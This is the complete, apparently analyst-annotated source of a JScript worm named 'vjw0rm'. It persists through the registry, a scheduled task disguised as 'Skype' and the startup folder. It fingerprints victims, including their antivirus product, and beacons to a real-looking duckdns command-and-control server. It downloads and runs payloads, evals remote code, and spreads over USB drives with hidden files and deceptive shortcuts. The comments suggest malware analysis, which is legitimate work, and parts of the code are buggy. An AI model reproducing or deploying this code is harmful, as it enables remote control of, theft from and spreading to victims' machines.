var WindowsTools = ["WScript.Shell","Scripting.FileSystemObject","Shell.Application","Microsoft.XMLHTTP"];
var RegistryEntries = ["HKCU","HKLM","HKCU\\vjw0rm","\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\","HKLM\\SOFTWARE\\Classes\\","REG_SZ","\\defaulticon\\"];
var WindowsMgmt = ["winmgmts:","win32_logicaldisk","Win32_OperatingSystem",'AntiVirusProduct'];

var shell = ReturnWindowsTool(0);
var FileSystem = ReturnWindowsTool(1);
var SplitDelim = "|V|";
var BackSlash = "\\";
var HDDSerial = "windows" + "_" + GetInfo(6);
var ScriptName = WScript.ScriptName;
var ScriptFullName = WScript.ScriptFullName;
var GlobalTrashVar;
try {
    // shell.RegRead('HKCU\\vjw0rm')
    // Reading registry key HKCU\\vjw0rm and storing it into GlobalTrashVar. value is either TRUE or FALSE
    GlobalTrashVar = shell.RegRead(RegistryEntries[2]);
} catch(err) {
    var sv = ScriptFullName.split("\\");
    if (":\\" + sv[1] + "== :\\" + ScriptName) { // If script is in top dir (c:\, e:\, etc)
	GlobalTrashVar = "TRUE";
	// Writing REG_SZ key HKCU\\vjw0rm with TRUE
	shell.RegWrite(RegistryEntries[2],GlobalTrashVar,RegistryEntries[5]);
    } else {
	GlobalTrashVar = "FALSE";
	// Writing REG_SZ key HKCU\\vjw0rm with FALSE
	shell.RegWrite(RegistryEntries[2],GlobalTrashVar,RegistryEntries[5]);
    }
}
// Try to persist on computer by various means
Persist();
do {
    try {
	var Response = PostFingerPrint('Vre','');
	Response = Response.split(SplitDelim);
	if (Response[0] === "Cl") {
	    WScript.Quit(1);
	}

	// Drop file and run it ?
	if (Response[0] === "Sc") {
	    var s2 = GetEnvironementVar("temp") + "\\" + Response[2];
	    var fi = FileSystem.CreateTextFile(s2,true);
	    fi.Write(Response[1]);
	    fi.Close();
	    shell.run(s2);
	}

	// executes arbitrary JavaScript ?
	if (Response[0] === "Ex") {
	    eval(Response[1]);
	}

	if (Response[0] === "Rn") {
	    var ri = FileSystem.OpenTextFile(ScriptFullName,1);
	    var fr = ri.ReadAll();
	    ri.Close();
	    HDDSerial = HDDSerial.split("_");
	    fr = fr.replace(HDDSerial[0],Response[1]);
	    var wi = FileSystem.OpenTextFile(ScriptFullName,2,false);
	    wi.Write(fr);
	    wi.Close();
	    shell.run("wscript.exe //B \"" + ScriptFullName + "\"");
	    WScript.Quit(1);
	}

	
	if (Response[0] === "Up") {
	    var s2 = GetEnvironementVar("temp") + "\\" + Response[2];
	    var ctf = FileSystem.CreateTextFile(s2,true);
	    var gu = Response[1];
	    gu = gu.replace("|U|","|V|");
	    ctf.Write(gu);
	    ctf.Close();
	    shell.run("wscript.exe //B \"" + s2 + "\"",6);
	    WScript.Quit(1);
	}

	if (Response[0] === "Un") {
	    var s2 = Response[1];
	    var scriptPathTemp = GetEnvironementVar("Temp") + BackSlash + ScriptName;
	    var regi = "URCWXKQC01";
	    s2 = s2.replace("%f",ScriptFullName).replace("%n",ScriptName).replace("%sfdr",scriptPathTemp).replace("%RgNe%",regi);
	    eval(s2);
	    WScript.Quit(1);
	}

	if (Response[0] === "RF") {
	    var s2 = GetEnvironementVar("temp") + "\\" + Response[2];
	    var fi = FileSystem.CreateTextFile(s2,true);
	    fi.Write(Response[1]);
	    fi.Close();
	    shell.run(s2);
	}
   } catch(err) {
   }
    WScript.Sleep(7000);
    PropagateOnUsb();
} while (true) ;


function GetEnvironementVar(VariableName) {
    return shell.ExpandEnvironmentStrings("%" + VariableName + "%");
}
function PostFingerPrint(ressource,body) {
    // x = ReturnWindowsTool('XMLHTTP');
    // curl -A 'windows_0AEFADF6\DESKTOP-V3RVKO3\test\Microsoft Windows 10 Enterprise Evaluation\Windows Defender\\NO\TRUE\' --data ''  http://postventa-vodafone2006.duckdns.org:1993/Vre
    var X = ReturnWindowsTool(3);
    X.open('POST','http://postventa-vodafone2006.duckdns.org:1993/' + ressource, false);
    X.SetRequestHeader("User-Agent:",FingerPrint());
    X.send(body);
    return X.responsetext;
}


function FingerPrint() {
    var s,NT,i;
    if (FileSystem.fileexists(GetEnvironementVar("Windir") + "\\Microsoft.NET\\Framework\\v2.0.50727\\vbc.exe")) {
	NT ="YES";
    } else {
	NT = "NO";
    }
    // windows_0AEFADF6\DESKTOP-V3RVKO3\test\Microsoft Windows 10 Enterprise Evaluation\Windows Defender\\NO\TRUE\
    s = HDDSerial + BackSlash + GetEnvironementVar("COMPUTERNAME") + BackSlash + GetEnvironementVar("USERNAME") + BackSlash + GetInfo(2) + BackSlash + GetInfo(4) + BackSlash + BackSlash + NT + BackSlash + GlobalTrashVar + BackSlash;
    return s;
}

function ReturnWindowsTool(ID) {
    return new ActiveXObject(WindowsTools[ID]);
}

function GetInfo(Action) {
    var s;
    // Get the os version
    if (Action == 2) {
	// GetObject('winmgmts:').InstancesOf('Win32_OperatingSystem');
	s = GetObject(WindowsMgmt[0]).InstancesOf(WindowsMgmt[2]);
	var en = new Enumerator(s);
	for (; !en.atEnd();en.moveNext()) {
	    var it = en.item();
	    return it.Caption;
	    break;
	}
    }
    // Enumerate Antivirus product and return the name of the AV
    if (Action == 4) {
	var wmg = "winmgmts:\\\\localhost\\root\\securitycenter";
	// GetObject(wmg).InstancesOf('AntiVirusProduct');
	s = GetObject(wmg).InstancesOf(WindowsMgmt[3]);
	var en = new Enumerator(s);
	for (; !en.atEnd();en.moveNext()) {
	    var it = en.item();
	    var str = it.DisplayName;
	}
	if (str !== '') {
	    // Look in winmgmts:\\\\localhost\\root\\securitycenter2
	    wmg = wmg + "2";
	    // GetObject(wmg).InstancesOf('AntiVirusProduct');
	    s = GetObject(wmg).InstancesOf(WindowsMgmt[3]);
	    en = new Enumerator(s);
	    for (; !en.atEnd();en.moveNext()) {
		it = en.item();
		return it.DisplayName;
	    }
	} else {
	    return it.DisplayName;
	}
    }
    // Get the serial number of the hdd
    if (Action==6) {
	// GetObject('winmgmts:').InstancesOf('win32_logicaldisk');
	s = GetObject(WindowsMgmt[0]).InstancesOf(WindowsMgmt[1]);
	var en = new Enumerator(s);
	for (; !en.atEnd();en.moveNext()) {
	    var it = en.item();
	    return it.volumeserialnumber;
	    break;
	}
    }
}

function Persist() {
	// Creates a path in tmp for the script
    var PathToScriptInTMP = GetEnvironementVar("TEMP") + BackSlash + ScriptName;
    try {
	// copy file in tmp
	FileSystem.CopyFile(ScriptFullName,PathToScriptInTMP,true);
    } catch(err) {
    }
    try {
	// Writes registry REG_SZ HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\URCWXKQC01 to start the newly created script in tmp
	shell.RegWrite(RegistryEntries[0] + RegistryEntries[3] + "URCWXKQC01","\"" + PathToScriptInTMP + "\"",RegistryEntries[5]);
    } catch(err) {
    }
    try {
	// Create a scheduled task named skype to run the script every 30 minutes 
	shell.run("Schtasks /create /sc minute /mo 30 /tn Skype /tr \"" + PathToScriptInTMP,false);
    } catch(err) {
    }
    
    try {
	// Shell.Application
	var app = ReturnWindowsTool(2);
	WScript.Echo(app.NameSpace(7).Self.Path)
	// Write the script in startup folder. app.NameSpace(7).Self.Path returns path to startup folder
	FileSystem.CopyFile(ScriptFullName, app.NameSpace(7).Self.Path + "\\" + ScriptName,true);
    } catch(err) {
    }
}


function PropagateOnUsb() {
    try {
	// var WindowsMgmt = ["winmgmts:","win32_logicaldisk","Win32_OperatingSystem",'AntiVirusProduct'];
	// var ld = GetObject("winmgmts:").InstancesOf('win32_logicaldisk');
	var LogicalDisk = GetObject(WindowsMgmt[0]).InstancesOf(WindowsMgmt[1]); 
	var edi = new Enumerator(LogicalDisk);
	// Enumerate drives
	for (;!edi.atEnd();edi.moveNext())  
	{       
	    var drive = edi.item();
	    // Get the unique identifier of the logicaldisk
	    var drive = FileSystem.GetDrive(drive.DeviceID); 
	    var DrivePath = drive.Path + "\\";
	    if (drive.IsReady) {
		// if drive is removable
		if (drive.DriveType === 1) {
		    // Copy the script to the removable media
		    FileSystem.CopyFile(ScriptFullName,DrivePath + ScriptName,true);
		    if (FileSystem.FileExists(DrivePath + ScriptName)) {
			// set the hidden and system flags on the file
			// https://msdn.microsoft.com/en-us/library/windows/desktop/gg258117(v=vs.85).aspx
			FileSystem.GetFile(DrivePath + ScriptName).attributes=2+4;
		    }
		    try {
			var ef = new Enumerator(FileSystem.GetFolder(DrivePath).SubFolders);
			// Enumerates folders on removable media
			for (;!ef.atEnd();ef.moveNext()) {
			    var gf = ef.item();
			    gf.attributes=2+4;
			    // ScriptName = ScriptName.replace(" ", "\" \"");
			    // Does nothing
			    ScriptName = ScriptName.replace(" ", "\"" + " " + "\"");
			    var n = gf.name;
			    // Also does nothing as n is never used afterwards
			    n = n.replace(" ", "\"" + " " + "\"");
				// Creates a shortcut on removable media
			    var sr = shell.CreateShortCut(DrivePath + gf.name + ".lnk");
				// 7 means windows is minimized and activates the next top level windows
			    sr.WindowStyle = 7;
				// Makes the shortcut open cmd.exe, then explorer to make it look like nothing fishy happened
			    sr.TargetPath  = "cmd.exe";
			    sr.Arguments = "/c start " + ScriptName + "&start explorer " + n + "&exit";
			    var defaultFolderIconKey = "HKLM\\software\\classes\\folder\\defaulticon\\";
			    var defaultFolderIconPath = shell.RegRead(defaultFolderIconKey); //fic
			    var iconLocation = sr.IconLocation; //ci
			    var sci = ",";
			    if (ci.indexOf(sci) !== -1) {
				sr.IconLocation = defaultFolderIconPath;
			    } else {
				sr.IconLocation = gf.Path;
			    }
			    sr.Save();
			}

		    } catch(err) {}
		    try {
			var files = new Enumerator(FileSystem.GetFolder(DrivePath).Files);
			// Enumerates files on usb device
			for (;!file.atEnd();file.moveNext()) {
			    var currentFile = file.item(); // gfi
			    var dot = ".";
			    var lnk = "lnk";
			    // If filename contains ".lnk"
			    if (currentFile.name.indexOf(dot) !== -1) {
				if (currentFile.name.indexOf(lnk) !== -1) {
				} else {
				    // verifies that current file is not the actual script
				    if (currentFile.name !== ScriptName) {
					// sets hidden and system flags
					currentFile.attributes=2+4;
					var currentFileName = currentFile.name;
					currentFileName = currentFileName.replace(" ", "\"" + " " + "\"");
					ScriptName = ScriptName.replace(" ", "\"" + " " + "\"");
					// creates a shortcut on the usb drive, actually overwrites the old file
					var shr = sh.CreateShortCut(DrivePath + currentFile.name + ".lnk");
					shr.WindowStyle=7;
					shr.TargetPath = "cmd.exe";
					shr.Arguments = "/c start " + ScriptName + "&start " + nu + "&exit";
					var sgf = currentFile.name.split(".");
					// read
					var fvi = shell.RegRead(RegistryEntries[4] + "." + sgf[sgf.length -1] + "\\");
					var fvi2 = shell.RegRead(RegistryEntries[4] + fvi + RegistryEntries[6] + "\\");
					var ci = shr.IconLocation;
					var sci = ",";
					if (ci.indexOf(sci) !== -1) {
					    shr.IconLocation = fvi2;
					} else {
					    shr.IconLocation = currentFile.Path;
					}
					shr.Save();
				    }
				}
			    }
			}
		    } catch(err) {}
		}
	    }
	}

    } catch(err) {

    }
}
